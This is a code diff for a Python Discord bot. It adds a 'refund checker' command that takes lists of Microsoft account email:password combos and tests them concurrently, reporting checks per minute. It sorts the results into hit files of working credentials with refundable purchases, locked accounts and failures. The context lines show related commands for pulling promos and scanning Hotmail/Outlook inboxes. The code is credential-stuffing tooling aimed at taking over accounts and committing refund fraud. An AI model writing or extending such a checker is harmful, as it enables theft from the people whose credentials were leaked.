@@ -960,6 +960,139 @@ async def slash_promopuller(interaction: discord.Interaction, accounts: str = No
     await do_promopuller(interaction, accounts, accounts_file, is_slash=True)
 
 
+# ── Refund checker shared logic ──
+
+async def do_refund_check(ctx_or_inter, accounts=None, threads=10, is_slash=False):
+    """Shared refund check logic."""
+    user = ctx_or_inter.user if is_slash else ctx_or_inter.author
+
+    async def send(embed=None, files=None, **kw):
+        if is_slash:
+            if files:
+                return await ctx_or_inter.followup.send(embed=embed, files=files, **kw)
+            return await ctx_or_inter.followup.send(embed=embed, **kw)
+        if files:
+            return await ctx_or_inter.send(embed=embed, files=files, **kw)
+        return await ctx_or_inter.send(embed=embed, **kw)
+
+    if not accounts:
+        return await send(embed=e().add_field(name="", value="No valid email:pass combos provided."))
+    if len(accounts) > MAX_COMBO_LINES:
+        return await send(embed=e().add_field(name="", value=f"Too many accounts. Max {MAX_COMBO_LINES} lines."))
+
+    tc = min(max(threads, 1), 30)
+    total = len(accounts)
+    msg = await send(embed=e().add_field(name="", value=(
+        f"🔍 **Refund Checker**\n"
+        f"Scanning {total} accounts for refund-eligible purchases ({tc} threads)...\n\n"
+        f"`{bar(0, total)}`"
+    )))
+
+    if is_slash and msg is None:
+        msg = await ctx_or_inter.original_response()
+
+    stop = threading.Event()
+    active_stops[str(user.id)] = stop
+    t0 = time.time()
+    last_edit = [0]
+    live_hits = [0]
+    live_fails = [0]
+
+    def on_progress(done, total_count, status=None):
+        nonlocal live_hits, live_fails
+        if status == "hit":
+            live_hits[0] += 1
+        elif status == "fail":
+            live_fails[0] += 1
+        now = time.time()
+        if now - last_edit[0] < 2:
+            return
+        last_edit[0] = now
+        sec = now - t0
+        cpm = round(done / (sec / 60)) if sec > 0 else 0
+        em = e()
+        em.description = (
+            f"🔍 **Refund Checker**\n\n"
+            f"`{bar(done, total_count)}`\n\n"
+            f"CPM: {cpm} | ⏱ {sec:.1f}s\n"
+            f"💰 Refundable: {live_hits[0]} | ❌ No Refund: {live_fails[0]}"
+        )
+        try:
+            asyncio.run_coroutine_threadsafe(msg.edit(embed=em), bot.loop)
+        except Exception:
+            pass
+
+    results = await bot.loop.run_in_executor(
+        None, lambda: check_refund_accounts(accounts, tc, on_progress, stop)
+    )
+
+    active_stops.pop(str(user.id), None)
+
+    # Categorize results
+    hit_results = [r for r in results if r.get("status") == "hit"]
+    free_results = [r for r in results if r.get("status") == "free"]
+    locked_results = [r for r in results if r.get("status") == "locked"]
+    fail_results = [r for r in results if r.get("status") == "fail"]
+
+    sec = time.time() - t0
+    cpm = round(len(results) / (sec / 60)) if sec > 0 else 0
+
+    # Build result embed
+    re_em = e(thumb=True)
+    re_em.title = "💰 Refund Check Results"
+    re_em.add_field(name="Checked", value=f"`{len(results)}`", inline=True)
+    re_em.add_field(name="Refundable", value=f"`{len(hit_results)}`", inline=True)
+    re_em.add_field(name="No Refund", value=f"`{len(free_results)}`", inline=True)
+    re_em.add_field(name="Locked", value=f"`{len(locked_results)}`", inline=True)
+    re_em.add_field(name="Failed", value=f"`{len(fail_results)}`", inline=True)
+    re_em.add_field(name="CPM", value=f"`{cpm}`", inline=True)
+
+    # Build output files
+    files = []
+
+    if hit_results:
+        hit_lines = []
+        for r in hit_results:
+            refundable = r.get("refundable", [])
+            items_str = " | ".join(
+                f"{item['title']} ({item.get('days_ago', '?')}d ago, {item.get('amount', 'N/A')})"
+                for item in refundable[:5]
+            )
+            caps = " | ".join(f"{k}: {v}" for k, v in r.get("captures", {}).items()
+                              if k not in ("Refundable", "Total Refundable"))
+            line = f"{r['user']}:{r['password']} | Items: {items_str}"
+            if caps:
+                line += f" | {caps}"
+            hit_lines.append(line)
+        files.append(txt_file(hit_lines, "Refundable.txt"))
+
+    if free_results:
+        free_lines = [f"{r['user']}:{r['password']}" for r in free_results]
+        files.append(txt_file(free_lines, "No_Refund.txt"))
+
+    if locked_results:
+        lock_lines = [f"{r['user']}:{r['password']} -> {r.get('detail', '')}" for r in locked_results]
+        files.append(txt_file(lock_lines, "Locked.txt"))
+
+    try:
+        dm = await user.create_dm()
+        await dm.send(embed=re_em, files=files)
+        await msg.edit(embed=e().add_field(name="", value=f"💰 Refund check done — {len(hit_results)} refundable found. Check DMs."))
+    except Exception:
+        await msg.edit(embed=re_em, files=files if files else None)
+
+
+@bot.tree.command(name="refund", description="Check Microsoft accounts for refund-eligible purchases/subs")
+@app_commands.describe(accounts="Accounts as email:pass", accounts_file="Text file with email:pass", threads="Concurrent threads (1-30)")
+async def slash_refund(interaction: discord.Interaction, accounts: str = None, accounts_file: discord.Attachment = None, threads: app_commands.Range[int, 1, 30] = 10):
+    await interaction.response.defer()
+    accs = []
+    if accounts:
+        parsed, _ = extract_combos(accounts)
+        accs.extend(parsed)
+    if accounts_file:
+        accs.extend([l for l in await fetch_lines(accounts_file) if ":" in l])
+    await do_refund_check(interaction, accs, threads, is_slash=True)
 
 
 @bot.tree.command(name="inboxaio", description=f"Scan Hotmail/Outlook inboxes for {get_service_count()}+ services")
